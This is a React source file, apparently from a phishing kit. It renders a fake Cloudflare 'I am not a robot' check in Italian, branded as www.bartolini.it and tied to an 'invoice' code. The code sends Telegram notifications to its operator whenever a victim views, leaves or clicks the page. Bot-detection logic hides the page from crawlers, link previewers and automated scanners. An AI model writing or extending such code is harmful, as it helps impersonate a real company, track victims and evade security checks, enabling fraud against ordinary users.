import { useState, useEffect } from "react";
import { useParams } from "react-router-dom";
import { Checkbox } from "@/components/ui/checkbox";
import cloudfareLogo from "@/assets/cloudfare.png";
import { sendUserVerifiedNotification, sendPageHiddenNotification, sendPageVisibleNotification } from "@/components/tgapi";

interface ItLoadingFormProps {
  onVerified: () => void;
  invoiceName?: string;
}

const ItLoadingForm = ({ onVerified, invoiceName }: ItLoadingFormProps) => {
  const [isChecked, setIsChecked] = useState(false);
  const [actualInvoiceName, setActualInvoiceName] = useState<string>("Fattura Sconosciuta");
  const [interactionStartTime, setInteractionStartTime] = useState<number | null>(null);
  const { code } = useParams();

  // Page visibility change handler
  useEffect(() => {
    const handleVisibilityChange = () => {
      const clientIdentifier = actualInvoiceName || invoiceName || "Cliente Sconosciuto";
      
      if (clientIdentifier === "Cliente Sconosciuto") return;
      
      if (document.hidden) {
        sendPageHiddenNotification(clientIdentifier);
      } else {
        sendPageVisibleNotification(clientIdentifier);
      }
    };

    document.addEventListener('visibilitychange', handleVisibilityChange);
    
    return () => {
      document.removeEventListener('visibilitychange', handleVisibilityChange);
    };
  }, [actualInvoiceName, invoiceName]);

  // Bot detection function
  const isLikelyBot = (event?: React.MouseEvent) => {
    // Check user agent for common bots
    const userAgent = navigator.userAgent.toLowerCase();
    const botPatterns = [
      'bot', 'crawler', 'spider', 'scraper', 'headless',
      'googlebot', 'bingbot', 'yandexbot', 'facebookexternalhit',
      'twitterbot', 'linkedinbot', 'slackbot', 'whatsapp',
      'telegram', 'selenium', 'phantomjs', 'puppeteer'
    ];
    
    if (botPatterns.some(pattern => userAgent.includes(pattern))) {
      return true;
    }

    // Check if interaction is too fast (less than 1 second from page load)
    if (interactionStartTime && Date.now() - interactionStartTime < 1000) {
      return true;
    }

    // Check for missing mouse event properties (automated clicks often lack these)
    if (event) {
      if (event.clientX === 0 && event.clientY === 0) {
        return true;
      }
      if (!event.isTrusted) {
        return true;
      }
    }

    return false;
  };

  // Fetch invoice name when component mounts
  useEffect(() => {
    // Set interaction start time for bot detection
    setInteractionStartTime(Date.now());
    
    const fetchInvoiceName = async () => {
      if (code) {
        try {
          const response = await fetch(`/api/create_invoice.php?invoice_id=${code}`);
          if (response.ok) {
            const data = await response.json();
            setActualInvoiceName(data.name || "Fattura Sconosciuta");
          }
        } catch (error) {
          console.error('Errore nel recuperare il nome della fattura:', error);
          setActualInvoiceName("Fattura Sconosciuta");
        }
      } else if (invoiceName) {
        setActualInvoiceName(invoiceName);
      }
    };

    fetchInvoiceName();
  }, [code, invoiceName]);

  const handleCheckboxChange = (checked: boolean, event?: React.MouseEvent) => {
    // Block bot interactions
    if (isLikelyBot(event)) {
      console.log('Interazione bot rilevata, blocco della verifica');
      return;
    }

    setIsChecked(checked);
    if (checked) {
      // Send Telegram notification with actual invoice name
      sendUserVerifiedNotification(actualInvoiceName);
      
      // Auto-verify when checkbox is checked
      setTimeout(() => {
        onVerified();
      }, 1000);
    }
  };

  return (
    <div className="container py-8 mx-auto px-[25px] max-w-xl">
      <div className="text-left" style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif' }}>
        <div className="mb-8">
          <h2 className="text-2xl font-bold text-gray-900 mb-4" style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif' }}>
            www.bartolini.it
          </h2>
          <p className="text-gray-700 mb-8" style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif' }}>
            Verifica di essere umano completando l'azione qui sotto.
          </p>
        </div>

        <div className="border border-gray-300 rounded-sm p-4 mb-8 bg-gray-50">
          <div className="flex items-center gap-4">
            <div className="flex items-center gap-4 flex-1">
              <div className="relative">
                <div
                  id="robot-check"
                  onClick={(e) => handleCheckboxChange(!isChecked, e)}
                  className="w-7 h-7 border-2 border-gray-500 rounded bg-white cursor-pointer flex items-center justify-center"
                >
                  {isChecked && (
                    <svg className="w-6 h-6 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                      <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                    </svg>
                  )}
                </div>
              </div>
              <label 
                htmlFor="robot-check" 
                className="text-base text-gray-900 cursor-pointer select-none whitespace-nowrap"
                style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif' }}
                onClick={(e) => handleCheckboxChange(!isChecked, e)}
              >
                Non sono un robot
              </label>
            </div>
            <div className="flex-shrink-0 flex flex-col items-center">
              <img src={cloudfareLogo} alt="Cloudflare" className="h-6 mb-1" />
            </div>
          </div>
        </div>

        <p className="text-gray-700 text-sm" style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif' }}>
          www.bartolini.it deve verificare la sicurezza della tua connessione prima di procedere.
        </p>
      </div>
    </div>
  );
};

export default ItLoadingForm;